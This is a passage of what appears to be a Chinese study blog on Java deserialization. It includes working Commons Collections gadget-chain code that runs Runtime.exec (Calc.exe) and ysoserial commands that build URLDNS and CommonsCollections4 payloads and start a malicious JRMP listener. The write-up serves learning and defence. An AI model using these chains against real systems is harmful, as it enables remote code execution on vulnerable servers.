&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们执行exec就要进行连续获取<code>getMethod</code>-&gt;<code>getRuntime</code>-&gt;<code>invoke</code>-&gt;<code>exec</code></p><p>那么获取执行方法实例的poc就是</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取Runtime类, o是java.lang.Runtime的Class对象</span></span><br><span class="line">Object o=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class).transform(Object.class);</span><br><span class="line"><span class="comment">// 获取getRuntime方法, a是getRuntime方法的Method对象</span></span><br><span class="line">Object a=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;).transform(o);</span><br><span class="line"><span class="comment">// 调用getRuntime方法, b是Runtime单例实例</span></span><br><span class="line">Object b=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;).transform(a);</span><br><span class="line"><span class="comment">// 执行exec命令</span></span><br><span class="line">Object c=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;).transform(b);</span><br></pre></td></tr></table></figure><h2 id="迭代调用"><a class="header-anchor" href="#迭代调用">¶</a>迭代调用</h2><p>那么直接调用的方式是我们需要手动的去调用他们的transform方法, 肯定无法在实战中使用, 我们需要找到一个可以进行迭代调用的方式</p><p>庆幸的是存在一个<code>ChainedTransformer</code>类, 该类实现了<code>Transformer</code>链式调用; 我们只需要传入一个<code>Transformer</code>数组<code>ChainedTransformer</code>就可以实现依次的去调用每一个<code>Transformer</code>的transform方法</p><p>那么我们通过<code>ChainedTransformer</code>类调用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(Object.class);</span><br></pre></td></tr></table></figure><p>那么这样就可以直接触发整个transformers数组的Transform方法。 面临的问题就是如何去触发<code>ChainedTransformer</code>的Transform方法。那么这个就是之后整个反序列链的基础链</p><h1>总结</h1><p>所以核心就是下面这三个</p><ul><li><code>ConstantTransformer</code>获取类</li><li><code>InvokerTransformer</code>反射方法</li><li><code>ChainedTransformer</code>迭代调用</li></ul><h1>完整代码</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testCC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        transformerChain.transform(Object.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化</title>
      <link href="/article/java-unser/"/>
      <url>/article/java-unser/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>参考文章</p><ol><li><a href="https://www.cnblogs.com/1vxyz/p/17231164.html">博客园-Java反序列化初探+URLDNS链</a></li></ol><h1>介绍</h1><p>Java 序列化是将 Java 对象转换为字节流的过程, 以便在网络上传输或者将对象保存到磁盘文件中; Java 反序列化则是将字节流反转回 Java 对象的过程, 以便在程序中使用这些对象</p><p>Java 序列化和反序列化的过程使用 <code>ObjectOutputStream</code> 和 <code>ObjectInputStream</code> 这两个类来实现;</p><p>序列化过程中, 将需要序列化的对象写入 <code>ObjectOutputStream</code> 中, 并通过网络或文件等途径传输或保存; 反序列化过程中则将字节流读入 <code>ObjectInputStream</code> 中，并通过类型转换得到原始对象</p><p>需要注意的是, 在进行序列化和反序列化时, 对象所对应的类需要实现 Java 序列化接口 Serializable, 否则会抛出序列化异常</p><h1>代码编写</h1><p>不知道原理会用也只是脚本小子</p><h2 id="例子"><a class="header-anchor" href="#例子">¶</a>例子</h2><p>该程序会在当前目录下创建名为<code>person.ser</code>的文件, 里面保存着序列化后的对象; 然后程序从文件中读取序列化的对象, 将其反序列化成一个<code>Person</code>对象, 最后输出这个对象的属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">25</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将对象序列化到文件</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;person.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);</span><br><span class="line">            out.writeObject(person);</span><br><span class="line">            out.close();</span><br><span class="line">            fileOut.close();</span><br><span class="line">            System.out.println(<span class="string">&quot;Serialized data is saved in person.ser&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从文件读取序列化的对象</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;person.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);</span><br><span class="line">            <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> (Person) in.readObject();</span><br><span class="line">            in.close();</span><br><span class="line">            fileIn.close();</span><br><span class="line">            System.out.println(<span class="string">&quot;Deserialized data:&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Name: &quot;</span> + deserializedPerson.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;Age: &quot;</span> + deserializedPerson.getAge());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可序列化的类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写一个可以序列化的类"><a class="header-anchor" href="#编写一个可以序列化的类">¶</a>编写一个可以序列化的类</h2><p>你已经发现了Person这个可以序列化的类实现了<code>Serializable</code>接口; 在Java当中,如果一个类需要被序列化和反序列化 ,需要实现<code>java.io.Serializable</code>接口</p><p>被transient修饰的属性不参与序列化过程, 属性设置为static的同样不参与</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> String name;</span><br></pre></td></tr></table></figure><h2 id="如何进行序列化和反序列化"><a class="header-anchor" href="#如何进行序列化和反序列化">¶</a>如何进行序列化和反序列化</h2><p>Java原生实现了一套序列化的机制,它让我们不需要额外编写代码,只需要实现<code>java.io.Serializable</code>接口,并调用ObjectOutputStream类的<code>writeObject</code>方法即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">serialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//生成Person对象的实例</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;1vxyz&quot;</span>, <span class="number">18</span>);  </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化的类</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 需要序列化的对象是谁?</span></span><br><span class="line">        obj.writeObject(person);</span><br><span class="line">        obj.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>反序列化同样</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">unserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 反序列化的类</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>((<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>)));</span><br><span class="line">        <span class="comment">// 读出来并反序列化</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) ois.readObject();</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="serialVersionUID"><a class="header-anchor" href="#serialVersionUID">¶</a>serialVersionUID</h2><p>同加解密, 如果两边的算法不一样是无法恢复明文的</p><p>同样在Java中与协议相对的概念为serialVersionUID, 当serialVersionUID不一致时,反序列化会直接抛出异常</p><h1>漏洞</h1><h2 id="漏洞成因"><a class="header-anchor" href="#漏洞成因">¶</a>漏洞成因</h2><p>java反序列化漏洞的关键出现在<code>java.io.ObjectInputStream.readObject()</code>上，反序列化会尝试执行反序列化的类的<code>readObject</code>方法，如果这个类重写了<code>readObject</code>方法，错误的调用了一些危险方法，则会造成漏洞</p><h2 id="可能的形式"><a class="header-anchor" href="#可能的形式">¶</a>可能的形式</h2><ol><li>入口类的<code>readObject</code>直接调用危险方法</li><li>入口类参数中包含可控类,该类有危险方法,<code>readObject</code>时调用</li><li>入口类参数中包含可控类,该类又调用其他有危险方法的类,<code>readObject</code>时调用比如类型定义为 Object, 调用<code>equals/hashcode/toString</code>相同类型, 同名函数</li><li>构造函数/静态代码块等类加载时隐式执行</li></ol><h1>学习工具</h1><p><a href="https://github.com/frohoff/ysoserial">github-ysoserial</a></p><h2 id="利用"><a class="header-anchor" href="#利用">¶</a>利用</h2><p>Java反序列化和php相同的是，php反序列化通过POP链最终要找到一个落脚点（RCE），这个落脚点一般都是开发自己写的。java通过gadget也要找一个落脚点触发恶意链，而这个落脚点在java标准库和一些常用库就有</p><blockquote><p>在Java安全领域，Gadget指的是一系列在目标应用的ClassPath中已存在的类的有机组合, 也就是调用链</p></blockquote><p>ysoserial上就集成了各种常用gadget，其中最简单的就是URLDNS</p><p>用法：<code>java -jar ysoserial.jar</code> 就可以看到有哪些gadget，它们适合的扩展库或者JDK版本</p><p>利用工具构造出一个恶意反序列化文件，来进行DNS查询</p><p>去DNSlog申请一个域名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar URLDNS <span class="string">&quot;http://1bvloh.dnslog.cn&quot;</span> &gt; ser.ser</span><br></pre></td></tr></table></figure><p>执行后就能在DNSlog中看到访问</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">unserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 反序列化的类</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>((<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>)));</span><br><span class="line">        <span class="comment">// 读出来并反序列化</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其他比如更常用的CommonsCollections4</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections4 <span class="string">&quot;ping dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure><p>起一个恶意RMI服务，一旦有人连接它，就发送恶意反序列化字节的payload</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial.jar ysoserial.exploit.JRMPListener 5555 CommonsCollections4 <span class="string">&quot;ping dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure><h1>拓展</h1><h2 id="定义"><a class="header-anchor" href="#定义">¶</a>定义</h2><p>因为之前学的php反序列化仅有一种固定的格式, 就将序列化和反序列化理解为将文件中的代码转换为一种更易存储的字符串</p><p>现在看到java中各种第三方组件, 序列化和反序列化不再有一种固定格式, 那么这个定义就要更新了</p><p>我对它的定义为:序列化 是将数据转换为一种更易传输和存储的格式反序列化 将数据从这种格式中还原</p><blockquote><p>看起来像是加密和解密啊</p></blockquote><p>比如下面这些都算序列化和反序列化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- JAVA内置的writeObject()/readObject()</span><br><span class="line">- JAVA内置的XMLDecoder()/XMLEncoder</span><br><span class="line">- XStream</span><br><span class="line">- SnakeYaml</span><br><span class="line">- FastJson</span><br><span class="line">- Jackson</span><br></pre></td></tr></table></figure><h2 id="风险组件"><a class="header-anchor" href="#风险组件">¶</a>风险组件</h2><ul><li>Apache Shiro</li><li>Apache Axis</li><li>Weblogic</li><li>Jboss</li><li>Fastjson</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TransformedMap调用链</title>
      <link href="/article/cc1-transformedmap/"/>
      <url>/article/cc1-transformedmap/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>结合<a href="CC%E8%BF%AD%E4%BB%A3%E8%B0%83%E7%94%A8%E9%93%BE.md">CC迭代调用链</a>,我们可以知道想进行RCE的核心是<code>ChainedTransformer</code>的Transformer方法, 本文中<code>TransformedMap</code>就是可以调用此方法的一条链</p><h1>CC1 TransformedMap链</h1><p>CC包中的TransformedMap类在进行put, checkSetValue等方法时, 可以触发transform方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">protect Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = <span class="built_in">this</span>.transformKey(key);</span><br><span class="line">    value = <span class="built_in">this</span>.transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC"><a class="header-anchor" href="#POC">¶</a>POC</h2><p>明显就是利用<code>TransformedMap</code>去触发迭代调用链, 先使用decorate进行赋值，然后使用put进行触发</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构建Transformer执行链</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class,Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将Transformer链封装为ChainedTransformer</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">        <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">// 创建原始Map并装饰为TransformedMap</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"><span class="comment">// 触发执行链</span></span><br><span class="line">outerMap.put(<span class="string">&quot;zeo&quot;</span>, <span class="string">&quot;666&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="解析"><a class="header-anchor" href="#解析">¶</a>解析</h2><p>这是<code>TransformedMap.decorate()</code> - 装饰器模式, 会创建一个特殊的TransformedMap, 此时这个<code>valueTransformer</code>是我们构造的transformerChain</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当调用<code>outerMap.put(&quot;zeo&quot;, &quot;666&quot;);</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    <span class="comment">// 关键：对value进行转换</span></span><br><span class="line">    value = transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这里触发transformerChain.transform(&quot;666&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>完整代码</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testCC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// 构建Transformer执行链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class,Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 